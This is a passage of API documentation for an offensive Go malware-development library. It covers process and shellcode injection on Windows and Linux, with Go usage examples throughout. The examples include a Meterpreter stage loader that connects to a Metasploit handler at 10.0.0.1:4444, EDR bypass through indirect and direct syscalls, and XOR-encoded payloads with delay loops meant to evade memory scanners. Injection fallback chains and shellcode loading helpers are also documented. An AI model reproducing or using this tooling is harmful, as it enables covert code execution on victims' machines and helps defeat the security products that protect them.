3. `VirtualProtect` (or `NtProtectVirtualMemory` via Caller) to PAGE_EXECUTE_READ
4. `CreateThread` (or `NtCreateThreadEx` via Caller) to execute the stage

**Caller support:** Yes. Pass a non-nil `*wsyscall.Caller` to route all security-sensitive
calls through direct/indirect syscalls. Pass `nil` for standard WinAPI behavior.

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

// Standard WinAPI:
inject.InjectMeterpreterWindows(stage, nil)

// With EDR bypass:
caller := wsyscall.New(wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate()))
inject.InjectMeterpreterWindows(stage, caller)
```

### InjectMeterpreterWrapper (Unix)

```go
func InjectMeterpreterWrapper(sockfd int, wrapper []byte) error
```

Executes the 126-byte Meterpreter wrapper shellcode on Linux/macOS. The wrapper reads the
full Meterpreter stage from a socket file descriptor.

**OS-level operation:**
1. `mmap` (RWX) for the wrapper shellcode
2. `dup2(sockfd, 0)` to redirect the socket to stdin (the wrapper reads from fd 0)
3. `fcntl` to clear `FD_CLOEXEC` on the socket
4. Spawn a goroutine with `runtime.LockOSThread`
5. `purego.SyscallN` to execute the wrapper

**This function blocks forever.** Once the wrapper takes control of the thread, it reads
the full stage from the socket, maps it into memory, and transfers execution to Meterpreter.
The Go runtime continues in other goroutines, but the calling goroutine never returns.

```go
// After establishing a TCP connection to the Metasploit handler:
conn, _ := net.Dial("tcp", "10.0.0.1:4444")
tcpConn := conn.(*net.TCPConn)
file, _ := tcpConn.File()

// Read the 126-byte wrapper from the handler
wrapper := make([]byte, 126)
io.ReadFull(file, wrapper)

// This blocks forever:
inject.InjectMeterpreterWrapper(int(file.Fd()), wrapper)
```

---

## Windows Syscall Bypass (EDR Evasion)

The `WindowsConfig` system lets you route NT syscalls through direct or indirect syscall
stubs, bypassing userland hooks installed by EDR products. This works with **every**
Windows injection method.

### WindowsConfig

```go
type WindowsConfig struct {
    Config

    // Controls how NT functions are invoked.
    // Default (zero value) is MethodWinAPI -- standard API calls.
    // Set to MethodDirect or MethodIndirect for EDR bypass.
    SyscallMethod wsyscall.Method

    // Resolves SSN (System Service Numbers) for Direct/Indirect methods.
    // If nil and SyscallMethod > MethodNativeAPI, defaults to Chain(HellsGate, HalosGate).
    SyscallResolver wsyscall.SSNResolver
}
```

**SyscallMethod values:**

| Value | Behavior |
|-------|----------|
| `wsyscall.MethodWinAPI` (default) | Standard calls through kernel32/ntdll (hookable) |
| `wsyscall.MethodNativeAPI` | Calls through ntdll directly (still hookable at ntdll level) |
| `wsyscall.MethodDirect` | Resolves SSN and executes `syscall` instruction from your own code |
| `wsyscall.MethodIndirect` | Resolves SSN but jumps to the `syscall` instruction inside ntdll (avoids "syscall from non-ntdll" detection) |

### DefaultWindowsConfig

```go
func DefaultWindowsConfig(method Method, pid int) *WindowsConfig
```

Returns a config with `MethodWinAPI` (most compatible, no bypass). Use this as a starting
point and override `SyscallMethod` if needed.

### NewWindowsInjector

```go
func NewWindowsInjector(cfg *WindowsConfig) (Injector, error)
```

Creates an injector from a `WindowsConfig`. If `SyscallMethod` is WinAPI or NativeAPI,
returns a standard `windowsInjector`. Otherwise, returns a `windowsSyscallInjector` that
routes these NT calls through the Caller:

- `NtAllocateVirtualMemory` (replaces VirtualAlloc/VirtualAllocEx)
- `NtWriteVirtualMemory` (replaces WriteProcessMemory)
- `NtProtectVirtualMemory` (replaces VirtualProtect/VirtualProtectEx)
- `NtCreateThreadEx` (replaces CreateRemoteThread/CreateThread/RtlCreateUserThread)
- `NtQueueApcThread` (replaces QueueUserAPC)
- `NtSuspendThread` (replaces SuspendThread)
- `NtGetContextThread` / `NtSetContextThread` (replaces Get/SetThreadContext)
- `NtWaitForSingleObject` (replaces WaitForSingleObject)

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

// Indirect syscalls (recommended for EDR bypass):
cfg := &inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateRemoteThread, PID: 1234},
    SyscallMethod: wsyscall.MethodIndirect,
    // SyscallResolver defaults to Chain(HellsGate, HalosGate) when nil
}
injector, err := inject.NewWindowsInjector(cfg)
if err != nil {
    log.Fatal(err)
}
err = injector.Inject(shellcode)

// Direct syscalls with custom resolver:
cfg2 := &inject.WindowsConfig{
    Config:          inject.Config{Method: inject.MethodQueueUserAPC, PID: 5678},
    SyscallMethod:   wsyscall.MethodDirect,
    SyscallResolver: wsyscall.NewHellsGate(),
}
injector2, _ := inject.NewWindowsInjector(cfg2)
injector2.Inject(shellcode)
```

### windowsSyscallInjector internals

When using Caller-backed injection, the `CreateThread` (ct) method gains additional
evasion features:

1. **XOR encoding** with a random key before writing to memory
2. **CPU delay loop** (random 0-5M iterations) instead of `Sleep` API
3. **In-place XOR decoding** after the delay
4. `NtProtectVirtualMemory` to transition from RW to RX
5. `NtCreateThreadEx` for execution
6. `NtWaitForSingleObject` with 100ms relative timeout

This means that even memory scanners running during the delay window will see only
XOR-encoded (random-looking) bytes, not recognizable shellcode signatures.

---

## Fallback System

### FallbackChain

```go
func FallbackChain(method Method) []Method
```

Returns the ordered list of methods to try if the preferred method fails.

**Windows fallback chains:**

| Preferred | Chain |
|-----------|-------|
| crt | crt -> apc -> rtl |
| ct | ct -> syscall -> fiber |
| apc | apc -> crt -> rtl |
| earlybird | earlybird -> threadhijack |
| threadhijack | threadhijack -> earlybird |
| rtl | rtl -> crt |
| syscall | syscall -> ct -> fiber |
| fiber | fiber -> ct -> syscall |

**Linux fallback chains:**

| Preferred | Chain |
|-----------|-------|
| ptrace | ptrace (no fallback) |
| memfd | memfd -> procmem |
| procmem | procmem -> memfd |

The chains are designed so that remote methods fall back to other remote methods, and
self-injection methods fall back to other self-injection methods.

### InjectWithFallback

```go
func InjectWithFallback(cfg *Config, shellcode []byte) error
```

Attempts injection using the method in `cfg.Method`, and if it fails, tries each
subsequent method in the fallback chain. Returns nil on the first success, or an
error wrapping the last failure if all methods fail.

```go
cfg := &inject.Config{
    Method:   inject.MethodCreateRemoteThread,
    PID:      1234,
    Fallback: true,
}
// Tries: CRT -> QueueUserAPC -> RtlCreateUserThread
err := inject.InjectWithFallback(cfg, shellcode)
if err != nil {
    log.Fatalf("all methods failed: %v", err)
}
```

---

## Shellcode Utilities

### Read

```go
func Read(path string) ([]byte, error)
```

Reads a shellcode file from disk. Returns an error if the file is empty or unreadable.

```go
shellcode, err := inject.Read("payload.bin")
if err != nil {
    log.Fatal(err)
}
```

### Validate

```go
func Validate(path string) (*ValidationResult, error)
```

Validates a shellcode file before injection without loading the full payload. Returns a
`ValidationResult` containing:

```go
type ValidationResult struct {
    Valid    bool
    Size     int
    Warnings []string
    Errors   []string
}
```

**Validation checks:**
- File exists and is readable
- File is not empty
- File is not larger than 50 MB (probably not shellcode)
- Warning if smaller than 50 bytes (suspiciously small)
- Warning if larger than 10 MB (large payload, slow injection)
- Warning if first 100 bytes are >90% ASCII printable (probably text, not binary)

```go
result, err := inject.Validate("payload.bin")
if err != nil {
    log.Fatal(err)
}
if !result.Valid {
    log.Fatalf("invalid shellcode: %v", result.Errors)
}
for _, w := range result.Warnings {
    log.Printf("warning: %s", w)
}
```

---

## Stats / Telemetry

### NewStats / Finish / Print

```go
func NewStats(method Method, shellcodeSize int, targetPID int) *Stats

func (s *Stats) Finish(err error)
func (s *Stats) Fprint(w io.Writer)
func (s *Stats) Print()
```

`Stats` tracks timing and outcome for an injection attempt:

```go
type Stats struct {
    Method        Method
    ShellcodeSize int
    TargetPID     int
    StartTime     time.Time
    Duration      time.Duration
    Success       bool
    Error         error
}
```

Usage pattern:

```go
stats := inject.NewStats(inject.MethodCreateRemoteThread, len(shellcode), targetPID)

injector, err := inject.NewInjector(cfg)
if err != nil {
    stats.Finish(err)
    stats.Print()
    return
}

err = injector.Inject(shellcode)
stats.Finish(err)
stats.Print()

// Output on success:
// [SUCCESS] Injection completed in 0.03s
//   Method: crt
//   Shellcode: 512 bytes
//   Target: PID 1234

// Output on failure:
// [FAILED] Injection failed after 0.01s
//   Error: OpenProcess failed: Access is denied.
```

`Fprint` writes to any `io.Writer` (useful for logging to files or network streams).
`Print` is a convenience wrapper that writes to stdout.
